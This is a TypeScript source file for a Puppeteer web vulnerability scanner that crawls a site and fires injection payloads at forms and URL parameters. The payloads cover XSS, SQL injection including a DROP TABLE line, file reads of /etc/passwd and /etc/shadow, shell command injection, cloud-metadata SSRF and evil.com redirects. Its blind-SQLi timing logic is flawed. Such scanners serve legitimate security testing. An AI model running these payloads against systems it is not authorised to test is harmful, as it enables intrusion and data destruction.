import puppeteer, { Browser, Page } from "puppeteer";
import { VulnerabilityDetector, ScanResult } from "./vulnerability-detector";
import { getConfig } from "./config";
import { logger } from "../utils/logger";

export interface ScanOptions {
  depth?: number;
  timeout?: number;
  headless?: boolean;
}

export class Scanner {
  private browser: Browser | null = null;
  private detector: VulnerabilityDetector;
  private visitedUrls: Set<string> = new Set();
  private crawledUrls: number = 0;
  private testedForms: number = 0;
  private requestsMade: number = 0;
  private headersChecked: Set<string> = new Set();

  constructor() {
    this.detector = new VulnerabilityDetector();
  }

  async initialize(options: ScanOptions = {}): Promise<void> {
    const config = getConfig();
    const headless = options.headless ?? true;

    this.browser = await puppeteer.launch({
      headless,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
      ],
    });

    logger.debug("Browser initialized");
  }

  async scan(targetUrl: string, options: ScanOptions = {}): Promise<ScanResult> {
    const startTime = Date.now();
    const depth = options.depth ?? 2;
    const timeout = options.timeout ?? 30000;

    if (!this.browser) {
      await this.initialize(options);
    }

    logger.info(`Starting scan of ${targetUrl} (depth: ${depth}, timeout: ${timeout}ms)`);

    await this.crawl(targetUrl, depth, timeout);

    await this.close();

    const duration = Date.now() - startTime;

    const result: ScanResult = {
      target: targetUrl,
      timestamp: new Date().toISOString(),
      duration,
      vulnerabilities: this.detector.getVulnerabilities(),
      summary: this.detector.getSummary(),
      metadata: {
        crawledUrls: this.crawledUrls,
        testedForms: this.testedForms,
        requestsMade: this.requestsMade,
      },
    };

    return result;
  }

  private async crawl(url: string, depth: number, timeout: number): Promise<void> {
    if (depth === 0 || this.visitedUrls.has(url)) {
      return;
    }

    this.visitedUrls.add(url);
    this.crawledUrls++;

    const page = await this.browser!.newPage();

    try {
      await page.setRequestInterception(true);
      page.on("request", (request) => {
        this.requestsMade++;
        request.continue();
      });

      const response = await page.goto(url, {
        waitUntil: "networkidle2",
        timeout,
      });

      if (!response) {
        logger.warn(`No response from ${url}`);
        return;
      }

      const host = new URL(url).host;
      if (!this.headersChecked.has(host)) {
        this.detector.analyzeSecurityHeaders(url, response.headers());
        this.headersChecked.add(host);
      }

      const content = await page.content();

      this.detector.detectSensitiveData(url, content);
      this.detector.detectInfoDisclosure(url, content);

      await this.testForms(page, url, timeout);

      await this.testUrlParameters(page, url, timeout);

      if (depth > 1) {
        const links = await this.extractLinks(page, url);
        for (const link of links.slice(0, 10)) {
          await this.crawl(link, depth - 1, timeout);
        }
      }
    } catch (error) {
      logger.error(`Error crawling ${url}: ${(error as Error).message}`);
    } finally {
      await page.close();
    }
  }

  private async testForms(page: Page, url: string, timeout: number): Promise<void> {
    const forms = await page.$$("form");

    for (const form of forms) {
      this.testedForms++;

      const formHtml = await form.evaluate((el) => el.outerHTML);
      this.detector.detectCSRF(url, formHtml);

      const inputs = await form.$$("input, textarea, select");

      for (const input of inputs) {
        const name = await input.evaluate((el) => el.getAttribute("name"));
        const type = await input.evaluate((el) => el.getAttribute("type"));

        if (!name || type === "hidden" || type === "submit") {
          continue;
        }

        await this.testXSS(page, url, name, timeout);
        await this.testSQLi(page, url, name, timeout);
        await this.testLFI(page, url, name, timeout);
        await this.testCMDI(page, url, name, timeout);
      }
    }
  }

  private async testUrlParameters(page: Page, baseUrl: string, timeout: number): Promise<void> {
    try {
      const url = new URL(baseUrl);
      const params = Array.from(url.searchParams.keys());

      for (const param of params) {
        await this.testIDOR(baseUrl, param, timeout);
        await this.testLFI(page, baseUrl, param, timeout);
        await this.testPathTraversal(page, baseUrl, param, timeout);
        await this.testCMDI(page, baseUrl, param, timeout);
        await this.testSSRF(page, baseUrl, param, timeout);
        await this.testOpenRedirect(page, baseUrl, param, timeout);
      }
    } catch (error) {
      logger.debug(`Error testing URL parameters: ${(error as Error).message}`);
    }
  }

  private async testXSS(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const payloads = [
      "<script>alert('XSS')</script>",
      '"><script>alert(1)</script>',
      "<img src=x onerror=alert(1)>",
      "'-alert(1)-'",
      "<svg/onload=alert(1)>",
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });

        const content = await page.content();
        this.detector.detectXSS(url, param, payload, content);
      } catch (error) {
        logger.debug(`XSS test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testSQLi(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const errorBasedPayloads = [
      "'",
      "1' OR '1'='1",
      "1; DROP TABLE users--",
      "' OR 1=1--",
      "' UNION SELECT 1--",
      "1' AND '1'='1",
    ];

    const timeBasedPayloads = [
      "' AND SLEEP(5)--",
      "1' AND SLEEP(5)--",
      "'; WAITFOR DELAY '00:00:05'--",
    ];

    const originalResponse = await page.content();

    for (const payload of errorBasedPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });

        const content = await page.content();
        this.detector.detectSQLi(url, param, content);
      } catch (error) {
        logger.debug(`SQLi test failed for ${param}: ${(error as Error).message}`);
      }
    }

    const startTime = Date.now();
    for (const payload of timeBasedPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
        const testTime = Date.now() - startTime;
        
        this.detector.detectBlindSQLi(url, param, 0, testTime);
      } catch (error) {
        logger.debug(`Blind SQLi test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testLFI(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const lfiPayloads = [
      "../../../../etc/passwd",
      "../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "..%2f..%2f..%2f..%2fetc%2fpasswd",
      "/etc/passwd",
      "/etc/shadow",
    ];

    for (const payload of lfiPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });

        const content = await page.content();
        this.detector.detectLFI(url, param, payload, content);
      } catch (error) {
        logger.debug(`LFI test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testPathTraversal(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const traversalPayloads = [
      "../../../../etc/passwd",
      "..%2f..%2f..%2f..%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "..\\..\\..\\..\\windows\\system32\\config\\sam",
    ];

    for (const payload of traversalPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });

        const content = await page.content();
        this.detector.detectPathTraversal(url, param, payload, content);
      } catch (error) {
        logger.debug(`Path traversal test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testCMDI(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const cmdiPayloads = [
      "; whoami",
      "| whoami",
      "`whoami`",
      "$(whoami)",
      "; id",
      "| id",
      "; cat /etc/passwd",
      "| ls -la",
      "& ping -c 3 127.0.0.1",
      "&& whoami",
    ];

    for (const payload of cmdiPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });

        const content = await page.content();
        this.detector.detectCMDI(url, param, payload, content);
      } catch (error) {
        logger.debug(`CMDI test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testSSRF(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const ssrfPayloads = [
      "http://localhost",
      "http://127.0.0.1",
      "http://169.254.169.254/latest/meta-data/",
      "https://metadata.google.internal/",
      "http://0.0.0.0",
      "http://[::1]",
    ];

    for (const payload of ssrfPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        
        try {
          await page.goto(testUrl, { waitUntil: "networkidle2", timeout: 5000 });
        } catch {
        }

        const content = await page.content();
        this.detector.detectSSRF(url, param, payload, content);
      } catch (error) {
        logger.debug(`SSRF test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testOpenRedirect(page: Page, url: string, param: string, timeout: number): Promise<void> {
    const redirectPayloads = [
      "https://evil.com",
      "https://google.com",
      "//evil.com",
      "///evil.com",
      "https://google.com%23",
      "javascript:alert(1)",
    ];

    for (const payload of redirectPayloads) {
      try {
        const testUrl = this.buildTestUrl(url, param, payload);
        
        const response = await page.goto(testUrl, { waitUntil: "domcontentloaded", timeout: 5000 });
        
        if (response) {
          const finalUrl = response.url();
          this.detector.detectOpenRedirect(url, param, payload, finalUrl);
        }
      } catch (error) {
        logger.debug(`Open redirect test failed for ${param}: ${(error as Error).message}`);
      }
    }
  }

  private async testIDOR(baseUrl: string, param: string, timeout: number): Promise<void> {
    const page = await this.browser!.newPage();
    
    try {
      const url = new URL(baseUrl);
      const originalValue = url.searchParams.get(param);

      if (!originalValue || isNaN(Number(originalValue))) {
        return;
      }

      const originalResponse = await page.goto(baseUrl, { waitUntil: "networkidle2", timeout });
      const originalContent = originalResponse ? await originalResponse.text() : "";

      const modifiedValue = String(Number(originalValue) + 1);
      url.searchParams.set(param, modifiedValue);
      const testUrl = url.toString();

      const testResponse = await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
      const testContent = testResponse ? await testResponse.text() : "";

      this.detector.detectIDOR(baseUrl, param, originalValue, testContent, originalContent);
    } catch (error) {
      logger.debug(`IDOR test failed for ${param}: ${(error as Error).message}`);
    } finally {
      await page.close();
    }
  }

  private buildTestUrl(baseUrl: string, param: string, value: string): string {
    const url = new URL(baseUrl);
    url.searchParams.set(param, value);
    return url.toString();
  }

  private async extractLinks(page: Page, baseUrl: string): Promise<string[]> {
    const links = await page.$$eval("a[href]", (anchors) =>
      anchors.map((a) => a.getAttribute("href")).filter(Boolean)
    );

    const absoluteLinks: string[] = [];

    for (const link of links) {
      if (!link) continue;

      try {
        const absolute = new URL(link, baseUrl);
        if (absolute.origin === new URL(baseUrl).origin) {
          absoluteLinks.push(absolute.toString());
        }
      } catch {
      }
    }

    return [...new Set(absoluteLinks)];
  }

  async close(): Promise<void> {
    if (this.browser) {
      await this.browser.close();
      this.browser = null;
    }
  }
}
